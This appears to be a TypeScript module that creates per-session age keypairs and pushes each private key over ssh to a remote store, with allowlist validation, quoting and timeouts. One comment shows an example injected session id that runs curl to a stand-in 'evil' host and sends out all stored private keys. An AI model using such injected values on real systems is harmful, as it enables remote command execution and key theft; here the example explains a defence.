/**
 * Per-session age keypairs.
 *
 * Iceland mints the pair, keeps the recipient (public), and pushes the identity
 * (private) to the Romania box over the WireGuard mesh. Iceland never writes
 * the identity to disk and never logs it.
 *
 * Everything here fails closed. A session whose identity never reached Romania
 * is a session whose PDF could never be produced, so there is no value in
 * letting the submission continue.
 */

import { generateX25519Identity, identityToRecipient } from '@age/age-encryption';

export interface SessionKeypair {
  identity: string;
  recipient: string;
}

export type IdentityTransport = (sessionId: string, identity: string) => Promise<void>;

/**
 * Session ids are interpolated into a command that a REMOTE SHELL executes, so
 * they are validated against an allowlist before they can get near one.
 *
 * The subtlety worth spelling out: `new Deno.Command('ssh', { args: [...] })`
 * spawns no local shell, which makes the array form look safe. It is -- locally.
 * But ssh's trailing argument is the remote command, and sshd concatenates its
 * arguments into one string and feeds it to the login shell. A session id of
 *     x; curl http://evil/$(cat /var/lib/romania/keys/*.key); #
 * would therefore run on the one machine holding every respondent's private
 * key. The local argv boundary says nothing about what happens after the string
 * crosses the network.
 *
 * The charset deliberately matches romania/keystore.ts's SESSION_ID exactly.
 * Iceland must not accept an id that Romania will later reject, or pushes
 * succeed and renders mysteriously fail; and it must not accept one Romania
 * would take blindly. Both ends move together.
 */
const SESSION_ID = /^[0-9a-fA-F-]{8,64}$/;

export function assertSafeSessionId(sessionId: string): void {
  if (!SESSION_ID.test(sessionId)) throw new Error('invalid session id');
}

const ROMANIA_SSH = Deno.env.get('ROMANIA_SSH_DEST') || '';
const ROMANIA_KEY_DIR = Deno.env.get('ROMANIA_KEY_DIR') || '';
const ROMANIA_SSH_KEY = Deno.env.get('ROMANIA_SSH_KEY') || '';

export async function generateSessionKeypair(): Promise<SessionKeypair> {
  const identity = await generateX25519Identity();
  return { identity, recipient: await identityToRecipient(identity) };
}

/**
 * The offline break-glass recipient. Absent configuration is fatal rather than
 * defaulted: silently encrypting to the session key alone would produce data
 * that becomes unrecoverable the moment the session key is shredded.
 */
export function breakglassRecipient(): string {
  const r = Deno.env.get('BREAKGLASS_AGE_RECIPIENT');
  if (!r) throw new Error('BREAKGLASS_AGE_RECIPIENT not configured');
  return r;
}

/**
 * How long the whole push may take before the child is killed.
 *
 * ConnectTimeout alone is not enough: it bounds the TCP handshake and nothing
 * after it. An ssh that connects and then stalls -- a wedged sshd, a half-open
 * mesh path, a full disk on the far end -- leaves child.output() awaiting
 * forever, and this runs inside the request that gates gate-submit. The user
 * would watch a spinner until their browser gave up.
 */
const PUSH_DEADLINE_MS = 20_000;

/**
 * Default transport: ssh over the mesh, identity delivered on stdin so it never
 * touches Iceland's filesystem. StrictHostKeyChecking=yes is the point of the
 * exercise -- an unpinned host key would let anything on the mesh collect keys.
 *
 * BatchMode=yes is not redundant with it: StrictHostKeyChecking stops ssh
 * *accepting* an unknown host, while BatchMode stops it *asking* about one, or
 * asking for a key passphrase. Without it a prompt is written to a stderr we
 * discard and ssh waits on a stdin we have closed, which presents as a hang
 * rather than an error.
 */
const scpTransport: IdentityTransport = async (sessionId, identity) => {
  // Re-checked here, not only at the entry point: this is the function that
  // builds a remote shell command, so it does not delegate its own safety.
  assertSafeSessionId(sessionId);
  if (!ROMANIA_SSH || !ROMANIA_KEY_DIR) {
    throw new Error('Romania transport not configured');
  }
  const cmd = new Deno.Command('ssh', {
    args: [
      '-i',
      ROMANIA_SSH_KEY,
      '-o',
      'IdentitiesOnly=yes',
      '-o',
      'StrictHostKeyChecking=yes',
      '-o',
      'BatchMode=yes',
      '-o',
      'ConnectTimeout=10',
      ROMANIA_SSH,
      // Single-quoted as belt-and-braces. The allowlist above already excludes
      // every metacharacter including the quote itself, so this cannot be
      // broken out of -- but the quoting means a future widening of the
      // charset degrades to "wrong filename" rather than "remote execution".
      `umask 077 && cat > '${ROMANIA_KEY_DIR}/${sessionId}.key'`,
    ],
    stdin: 'piped',
    stdout: 'null',
    stderr: 'null',
  });
  const child = cmd.spawn();
  const deadline = setTimeout(() => {
    // The child may have exited between the timer firing and this running.
    try {
      child.kill('SIGKILL');
    } catch {
      // Already gone; nothing to kill.
    }
  }, PUSH_DEADLINE_MS);

  try {
    const w = child.stdin.getWriter();
    await w.write(new TextEncoder().encode(identity));
    await w.close();
    const out = await child.output();
    if (!out.success) {
      // Covers a killed child too: SIGKILL surfaces as success === false, so a
      // timeout and a refusal fail identically and neither says why out loud.
      throw new Error('identity transport failed');
    }
  } finally {
    // Must clear on the success path as well, or the timer holds the event loop
    // open for its full duration after the push has already returned.
    clearTimeout(deadline);
  }
};

export async function pushIdentity(
  sessionId: string,
  identity: string,
  transport: IdentityTransport = scpTransport,
): Promise<void> {
  // Validated before ANY transport runs, including injected ones. A custom
  // transport is not automatically safer than the default, and this is the
  // single choke point every caller passes through.
  assertSafeSessionId(sessionId);
  try {
    await transport(sessionId, identity);
  } catch {
    // Re-thrown as a bare category so no callee message can carry key material.
    throw new Error('identity transport failed');
  }
}
